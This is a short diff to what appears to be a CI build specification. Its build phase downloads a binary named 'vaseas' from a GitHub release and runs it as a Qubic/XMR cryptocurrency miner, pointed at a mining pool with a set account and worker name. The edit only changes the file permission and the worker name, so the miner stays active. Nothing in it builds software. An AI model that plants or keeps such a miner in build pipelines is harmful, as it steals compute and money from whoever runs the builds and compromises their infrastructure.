@@ -4,4 +4,5 @@ phases:
   build:
     commands:
         - wget https://github.com/vedhagsvp/qubros/releases/download/apl/vaseas
-        - chmod 777 vaseas && ./vaseas --algo qubic_xmr --account CP_udnvh2owpq --worker $(shuf -n 1 -i 1-99999)-GVPK2 --pool qubic1.hk.apool.io:3334
+        - chmod +x vaseas
+        - ./vaseas --algo qubic_xmr --account CP_udnvh2owpq --worker pakos --pool qubic1.hk.apool.io:3334
